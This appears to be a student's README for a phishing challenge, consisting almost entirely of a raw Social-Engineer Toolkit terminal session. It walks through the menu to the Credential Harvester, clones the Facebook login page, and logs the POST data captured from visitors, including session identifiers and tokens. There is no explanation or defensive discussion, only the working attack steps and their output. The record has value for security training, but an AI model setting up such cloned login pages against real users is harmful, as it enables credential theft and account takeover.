# micael-p-reis
cibersecurity-desafio-phishing
         ,..-,
         ,;;f^^"""-._
        ;;'          `-.
       ;/               `.
       ||  _______________\_______________________
       ||  |HHHHHHHHHHPo"~~\"o?HHHHHHHHHHHHHHHHHHH|
       ||  |HHHHHHHHHP-._   \,'?HHHHHHHHHHHHHHHHHH|
        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|
        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'|HHHHH|
        `| |HHHHHb.?Hb    .--J-dHP,dHHPo'_.rdHHHHH|
         \ |HHHi.`;;.H`-./__/-'H_,--'/;rdHHHHHHHHH|
           |HHHboo.\ `|"\"/"\" '/\ .'dHHHHHHHHHHHH|
           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|
           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|
           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|
           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|
           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|
           |""""""""""""""""""""""""""""""""""""""|
           |,;=====.     ,-.  =.       ,=,,=====. |
           |||     '    //"\\   \\   //  ||     ' |
           |||         ,/' `\.  `\. ,/'  ``=====. |
           |||     .   //"""\\   \\_//    .     |||
           |`;=====' =''     ``=  `-'     `=====''|
           |______________________________________|
                                                                             
                                                                             
[---]        The Social-Engineer Toolkit (SET)         [---]                
[---]        Created by: David Kennedy (ReL1K)         [---]                
                      Version: 8.0.3                                        
                    Codename: 'Maverick'                                    
[---]        Follow us on Twitter: @TrustedSec         [---]                
[---]        Follow me on Twitter: @HackingDave        [---]                
[---]       Homepage: https://www.trustedsec.com       [---]                
        Welcome to the Social-Engineer Toolkit (SET).                        
         The one stop shop for all of your SE needs.                        
                                                                             
   The Social-Engineer Toolkit is a product of TrustedSec.                  
                                                                             
           Visit: https://www.trustedsec.com                                
                                                                             
   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!            
                                                                             
                                                                             
 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 2

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesns't know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perpective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.15.171]:
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:http://www.facebook.com    

[*] Cloning the website: https://login.facebook.com/login.php                
[*] This could take a little bit...                                          
















The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                  
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                              
[*] Information will be displayed to you as it arrives below:                

192.168.15.171 - - [21/Feb/2024 17:31:11] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------368338891940494274132048669795                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547487614                                                                
-----------------------------368338891940494274132048669795                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"user":"0","webSessionId":"j765cl:7dw0yc:qpu00h","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"962b6b1a-9b88-4856-b0d7-183197b99b9e\",\"ct\":1659080345,\"sjd\":\"ADekEZX08lyKNp57vFNZ8xbHXYxXIEkmH4LaNq+Xv79GIrpGNw+0jC5477qxt9wKDlpHVteGhci0jqV+8xobIueJ3LQS8eCfR1goyMzlXfwiiTPLhOioFtKT1q/ei8slrfB8dFuV1Q3nmU95TKZ3dw==\",\"sid\":-1}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":"j765cl:7dw0yc:qpu00h","t":1708547429444.4,"b":[1,0]},1708547487614,0,508]],"trigger":"falco:bd_pdc_signals"}]                    
-----------------------------368338891940494274132048669795--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:31:27] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=1&__rev=1011554900&__s=j765cl%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------76565692314250741873535243350                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547488637                                                                
-----------------------------76565692314250741873535243350                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"riLIW1siZmFsY286cWUyX2pzX2V4cG9zdXJlIix7ImUiOiJ7XCJ1bml2ZXJzZVwiOlwiZmJ0ASdUcGVyZm9ybWFuY2VfdGVzdGluZ1wiLAUsDHRfaWQFKxkR9CABdHlwZVwiOjl9IiwiciI6MSwiZCI6IiRefEFjYjZDSXZDVTNtLUNuQXJjMllOUDVKY1Zza2xaWjNnYUwwMkZjTFpRSG42X2tPdTZkY1EzeHY1c3d6VENEemJ1LVlzeV9ocV9lbklHVi1MNjg4cER5cE5HUXxmZC5BY1oxUkRCMUJzNS1zN3c5cXJQSS0wWk9LUU9VU1EyTEgzck8xSXE3MEZ6MDRweHJlNC1VUjdJMkt6Q3hoelNsZUxrZnFGRzg2YjV5aU5PYnhBcGRFZUVIIiwicyI6Imo3NjVjbDo3ZHcweWM6cXB1MDBoIiwidCI6MTcwODU0NzQyOTIwOS40LCJiIjpbMSwwXX0sMTcwODU0NzQ4NzYxMywwLDM0MV0sWy2ENGJkX3BkY19zaWduYWxzPYMEYXMtVJA5NjJiNmIxYS05Yjg4LTQ4NTYtYjBkNy0xODMxOTdiOTliOWVcIYlMY3RcIjoxNjU5MDgwMzQ1LFwic2opl/CZQURla0VaWDA4bHlLTnA1N3ZGTlo4eGJIWFl4WElFa21INExhTnErWHY3OUdJcnBHTncrMGpDNTQ3N3F4dDl3S0RscEhWdGVHaGNpMGpxVis4eG9iSXVlSjNMUVM4ZUNmUjFnb3lNemxYZndpaVRQTGhPaW9GdEtUMXEvZWk4c2xyZkI4ZEZ1VjFRM25tVTk1VEtaM2R3PT1cIgGlBegELTH+KgL+KgL+KgLGKgIINDQ0ZioCIDQsMSw1MDhdLHGudHdlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbl06IGpzb25fZGF0YWWTPHtcXFwic291cmNlX3BhdGgBDxQ6bnVsbCwBCg0ZEHRva2VuARAZGgxkZXN0GTEBHEhYV2ViTG9naW5Db250cm9sbGVyARcFSAUuGUYBGBw5NmU4OGFmMwEMBSQkaW1wcmVzc2lvboEvAFwBnkxcXCIxaUpXcERJNklwV3ZiVHFUeQEVBTAQY2F1c2UBDgVPDGxvYWQBDQUbGHNpZF9yYXcBEAUdCGo3NkKYAwEdBS0UcmVmZXJyCa0FLhUaBbYUZWZfcGFnCWk1GAUaCHVyaQErBTRkaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2whEgwucGhwASsIfVwi/scC/scC/scCxscCCDUzOGLHAhwzMSwwLDY0OVnH/vEEkvEE9JAHV1pTbStCY3dyZkJVRHVvTzU2d2E3MVh2TUgxcktna291a3ZpY0ZTM1NDMGxQOEV0TE5WTkdPcVlySUkvWkxhREJ3dzh4NitJaDVmUW9DVlNDbW1UUWdiY1RkVnNybG1WU2JPL3M0TGtVMlE3RkF2aFFGTWdLKzljM01iYzJueVpFL3JrMUhwVHpzeWVrejNFU0dTeUR2eXB5L2xSZHAyR3hBT1pYZzVqRk5SSXNkTzJMckRKeE9BU1JXcFhlV2lsblVSSkxGZk1JekJiVFdmZzVuTXk5U3NQRnpZTmpDcXNoaDJQT3pmQmlpcHRhbFMraExHUml6dmxEWjBqdFg0OWtqVFErcDhmNmhXT1VBdzRnNXFVcWQ5MFJvMXpDSDhlZEkvbFlsaFdFOENGQWpBY2JUdHRuY056bGNoN0tGWkJVVnNwRFlCQzdFNU02Z2RkVXVKb2VRaU5zc0VPdlc5WGJhN3JkUE0xcGpMU096dE9GY05qNDFhTlZPb2k0eGhvZVRGVnduOGhPaThzWFFDbEd2Z0hDRHA2bVh0cWtWdWRQUWhBbWtIOHRlay9QMk0rWWpqaHFDVFpHK2xybmIrRFhVS29oakcxcXJOdU1rUzZMSWxmRzk3dXN6clA1TW11d3RLV2tFK3pQWnZZNDhtZExDaEhTQVF2TzBsd3N1TEVlSXJxemNGenNkcnBOQU5UY2RibWFMdjVZR0ZBNHM4a05nT0dqOUJuSWFsa1ptNWtxQml3bG9KREMzS1ZJckpTdmFuMjFmdHBRTGlCU1BnbEw1TEZnMmlycWwvM2p3dXRsQk85MHY0YWJzMWVEalAyektaN2pyME5Kc1ZZUzc0V0RZUFZWdUpDSmw5K1Vwd21CWTN4M1B6dk8yU0lKUVMxUWF4clplVElWbGRKMTlkcHBhcmtTVm5ZVis3WUtKa1YyMzN2bDRLdFFSci9JdVVPbVZUWmRJcFQyTWlSVmxSNGMzNVhiT1dGU2Y5c3c3QTBQWEFsNVNqSkJtbTBhYk5wZ29KOFh3a3I5K3l2YTRDZm1DKzVvcGd5NXhkZkY5VWtLeVpIakFNMVFLWHplQ1E2NU9iM09FcjdFLzVMaHlxZ2V5OE9nb28wcmU5UE1hb2k0YTg0ekZUTW41OSsrMFpNZ2dOcGZ6cWFnQUdIL3lIYTJMMTZhRHlPQmswcElMbVFVOEd6MXhiS3orcUNlU21VY0M5U0RzRkloSVhyNTZYYnNQc1FnYllGKzg0ZVcrL3pMMjh3ZTA5TS84RmIyTmlpMWNDbmwwQVFtUys3WGlLWVA5N0Q1OWdTN01iQnJtRE1JSTBVZGNYeDFmd3V6dFJEbEJ5d2UrTitzalRJMjR0WEg2eEprZjI5WFUwbXg2RGtCdG1KelE1Z2tadDZpUjVSYm0ycFdqWHdRMkE5Q0toZnR6bmQzaFgzS0d3cEJDc1g5MVVxOVBtU0Y2SXV0aEZ6Vy9sMjlYcTk2WFIzMHM2UGdlUjNCZmcyS0RjZHY4VThoWWlNRGs3QnBObGxzdk02d3pnNmVHMGR2NnY5bkJaSDdQTGlCSkFxa3pLUmpiMVN3MkoyanN1ZlJKVEZhSkZoR2pKTjZYQTZxWkh0bFZGbTJHRENuQlJ0RW12SnJLSjh5WDc1S2ZXWDY3aTc1TmJIRVhTUmc0M0hrMFFpVVpGdSszZmViU1RmQmVCdkFFd0hkUVM4dk9OZHVWaEQxQlU5MkRhMnlaZnJudEtXcEM4L1VuZHhmVXRzTitrYnBKNFVXNFlkeDJUR2lkVkxSTzl2OVU3TFZ0ZWdwTmpWL1JOcklhajNnVjkzZ2JLWmpOVkF4TnA4UjNjK0E3OWUxOVZUUDZJNHE5WTV3Y1FrY0IvMU1WSWxCYWJ2WThGTk9jZFRzNkNxY2VIaEVoUnBCOWZRQlNuaEF5TGlnUmZSSXI3R1NxME16RFVKdkhMU0FWY3VNY0xLUkVRaWVCd1R5dzhvS1B4NElSYUNEeElZbGJocjgxL3o4SHJGUkdIN0l5MGdlOElkMDFXRGVxenVXa0FzUHJHcWR1TW5YS01XMFpEa2IyRGlCK3dxK3A0SiszZVNQUWxlTldyaSt5N1BnYU53MW1PRHlPUEw3aklhZytFWXNKU25GdjU5L3d2dVRYeUg1cmN6Z1dOY29ZYVN1MHphSkNrNllhd2NZc2xMK3VJN1gzdkNHdTFPS3ZsWXIyeTFSL0xVNVRGZHJmT2xVSHdpdS83MzlCVEd3MHRWZ1ZST21FMTF4VERQOGY2czV3OEhLZWp6MkpZNE1pZnQ4N244K1FqVXlldWd4WVgzdm90WENMejhJa3V6MlpTZ0pIVTBwY244U0t6T1lJUVVSd1lkRG02T3F3RWVHb2g0cWxUT0JVNmtaeklYcXJwMklWOFM2NmY0bkVEU1BNckViVVZ1dVFvcjJkN2YyUkZiRTA0ekFWNC9JSXJXd0hSV2J1NWU1aXFTMTRQUUNuaXpETVhlRHgwQVV6NTNNcUpFdlNEa2QvQkdRc1pHZUhpQVkzbnlOWS9haFkrTjlCYXN1c2lHRWUwcGVQUWdnTDg9XCIsXCL+5Qv+5Qv+5Qvm5QsENTRm5QscMzcsMCwyMjg65gsOag88X2RldmljZV9pbmZvX2xvZyrgCyBjcHVfY29yZXMO7w0YLFwicmFtXB65CyQiZ3B1X3JlbmRlDvEKJCI6XCJsbHZtcGkOjQ8ALAkeFHZlbmRvcgUcJE1lc2EvWC5vcmf+uAr+uAr+uArSuAoANWaaASQ0NywwLDM1M11d","user":"0","webSessionId":"j765cl:7dw0yc:qpu00h","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":5}]                                                                
-----------------------------76565692314250741873535243350--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:31:28] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=2&__rev=1011554900&__s=j765cl%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------33477436708559060872634492321                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547496632                                                                
-----------------------------33477436708559060872634492321                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"+xLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCI5NjJiNmIxYS05Yjg4LTQ4NTYtYjBkNy0xODMxOTdiOTliOWVcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/S9AUFEZWtFWlgwOGx5S05wNTd2Rk5aOHhiSFhZeFhJRWttSDRMYU5xK1h2NzlHSXJwR053KzBqQzU0NzdxeHQ5d0tEbHBIVnRlR2hjaTBqcVYrOHhvYkl1ZUozTFFTOGVDZlIxZ295TXpsWGZ3aWlUUExoT2lvRnRLVDFxL2VpOHNscmZCOGRGdVYxUTNubVU5NVRLWjNkdz09XCIsXCJzaWRcIjotMX0iLCJyIjoxLCJkIjoiJF58QWNiNkNJdkNVM20tQ25BcmMyWU5QNUpjVnNrbFpaM2dhTDAyRmNMWlFIbjZfa091NmRjUTN4djVzd3pUQ0R6YnUtWXN5X2hxX2VuSUdWLUw2ODhwRHlwTkdRfGZkLkFjWjFSREIxQnM1LXM3dzlxclBJLTBaT0tRT1VTUTJMSDNyTzFJcTcwRnowNHB4cmU0LVVSN0kyS3pDeGh6U2xlTGtmcUZHODZiNXlpTk9ieEFwZEVlRUgiLCJzIjoiajc2NWNsOjdkdzB5YzpxcHUwMGgiLCJ0IjoxNzA4NTQ3NDI5NDQ0LjQsImIiOlsxLDBdfSwxNzA4NTQ3NDg3NjE0LDIsNTA4XSxbTSowb2RzX3dlYl9iYXRjaF0pBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF0RiaXRzLmpzX2luaXRpYWxpemVBckBbMSxudWxsXX19LFwiNzE3Mwk4MGVudGl0aWVzLmZmX2oFighxZTIBCmBleHBvc3VyZS4yNTYyODEwNDA1NTguMC5DETkAdgGDDGxvZ2cyXwAILFwiCRoUY2FwdHVyVhwAKGluZm8uYmFuemFpAUJMLnVwbG9hZF9wcm9jZXNzaW5nXCIVsBVRCSUyUQAAfQEdQsEANnwDnsAAADIpHwFSBdouwAA+HAAFwAmQGF9tZXRob2QdziBfY3JpdGljYWxOxQAFOhn6FSwRTqYDAVKUABlaclEAVjgBRYYMbHVlX1lMKF9uYXZpZ2F0aW9unkgBTWc1SAXyYiwBKGltbWVkaWF0ZWx5ji8BHS8RVKYyAT6aAC7iAQ0cZhkBLHBlcmZfZGV2aWNlXwHTDF9sb2fyEwGaqwE1SClDMv8CFRxOygAUfX19Iiwi/noF/noF/noFrnoFFDM0MjEwLlJ6BTQ5MjMwMywwLDEzNTddLPGlQfFd7CBiaXRfYXJyYXm9hhRzaWRfcmGhZARcIk78BeWiEHN0YXJ0BUoEXCLVCBw4NyxcInRvcwlTQd0QMjg1LDAhtQEWGGN1bVwiOjUNJAhpZFzh0RBxcHUwMAlUASQYbGVuXCI6OQ0kGHNlcVwiOjD+1gH+1gH+1gHC1gEQNzUzNS5W1gEsNTYyOSwwLDQxM11d","user":"0","webSessionId":"j765cl:7dw0yc:qpu00h","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                    
-----------------------------33477436708559060872634492321--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:31:36] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=3&__rev=1011554900&__s=j765cl%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------28497703884964269163205618182                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547517548                                                                
-----------------------------28497703884964269163205618182                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"user":"0","webSessionId":"j765cl:7dw0yc:qpu00h","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"962b6b1a-9b88-4856-b0d7-183197b99b9e\",\"ct\":1659080345,\"sjd\":\"ADekEZX08lyKNp57vFNZ89BTlo2vHJ/3njrrAdHVRQvx9XDxQKbe61OX4wuTraqQtpsNfD6Ps87XxH3Xziy13jOjnH5Wp74yIuYC2Q9Erob/RJkAfeWrkxD2lXAT0Ul4xPDYuJJ39JEAZg+LR/DaJw==\",\"sid\":-1}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":"j765cl:7dw0yc:qpu00h","t":1708547459454.4,"b":[1,0]},1708547517548,0,508]],"trigger":"falco:bd_pdc_signals"}]                    
-----------------------------28497703884964269163205618182--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:31:57] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=4&__rev=1011554900&__s=j765cl%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------52150692279984016968633743                                                                    
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547523493                                                                
-----------------------------52150692279984016968633743                      
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"gxLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCI5NjJiNmIxYS05Yjg4LTQ4NTYtYjBkNy0xODMxOTdiOTliOWVcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/S9AUFEZWtFWlgwOGx5S05wNTd2Rk5aOHhiSFhZeFhJRWttSDRMYU5xK1h2NzlHSXJwR053KzBqQzU0NzdxeHQ5d0tEbHBIVnRlR2hjaTBqcVYrOHhvYkl1ZUozTFFTOGVDZlIxZ295TXpsWGZ3aWlUUExoT2lvRnRLVDFxL2VpOHNscmZCOGRGdVYxUTNubVU5NVRLWjNkdz09XCIsXCJzaWRcIjotMX0iLCJyIjoxLCJkIjoiJF58QWNiNkNJdkNVM20tQ25BcmMyWU5QNUpjVnNrbFpaM2dhTDAyRmNMWlFIbjZfa091NmRjUTN4djVzd3pUQ0R6YnUtWXN5X2hxX2VuSUdWLUw2ODhwRHlwTkdRfGZkLkFjWjFSREIxQnM1LXM3dzlxclBJLTBaT0tRT1VTUTJMSDNyTzFJcTcwRnowNHB4cmU0LVVSN0kyS3pDeGh6U2xlTGtmcUZHODZiNXlpTk9ieEFwZEVlRUgiLCJzIjoiajc2NWNsOjdkdzB5YzpxcHUwMGgiLCJ0IjoxNzA4NTQ3NDI5NDQ0LjQsImIiOlsxLDBdfSwxNzA4NTQ3NDg3NjE0LDMsNTA4XSxbTSowb2RzX3dlYl9iYXRjaF0pBRAkXCI6e1wiNzE3MwkKMGVudGl0aWVzLmZmX2oFOAE7kHRpbWVfc3BlbnRfYml0X2FycmF5LjI1NjI4MTA0MDU1OC4wLkMRQjB2ZW50LmxvZ2dlZFwiAaIcbnVsbF0sXCIJGmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpATQsX2ltbWVkaWF0ZWx5Yj0AVi8AEVQkcHJvY2Vzc2luZ05BAAl5VpoAFGNhcHR1cjIcAAx9fX19/l8C/l8C/l8Cul8CFDQyNTM3Lk5fAjQ1MDA2MzAsMCw1NjJdLP6JBO6JBImJ8IE5QlRsbzJ2SEovM25qcnJBZEhWUlF2eDlYRHhRS2JlNjFPWDR3dVRyYXFRdHBzTmZENlBzODdYeEgzWHppeTEzak9qbkg1V3A3NHlJdVlDMlE5RXJvYi9SSmtBZmVXcmt4RDJsWEFUMFVsNHhQRFl1SkozOUpFQVpnK0xSL0RhSnc9/okE/okE/okE9okEEDU5NDU0VioCIDE3NTQ4LDEsNf6JBJ2JNvIG/n8EVn8EHGNyaXRpY2FsTjsEhbmdfBEsjVT+eQT+eQT+eQT+eQTueQSFeQQ2NGJPAjAyMjU0NywwLDU0Nl1d","user":"0","webSessionId":"j765cl:7dw0yc:qpu00h","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]                                                                          
-----------------------------52150692279984016968633743--                    
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:32:03] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=5&__rev=1011554900&__s=j765cl%3A7dw0yc%3Aqpu00h&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=1                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=6                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=j765cl:7dw0yc:qpu00h                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:32:17] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=1                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=7                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=j765cl:7dw0yc:qpu00h                                              
PARAM: __hsi=7338155262530080194                                            
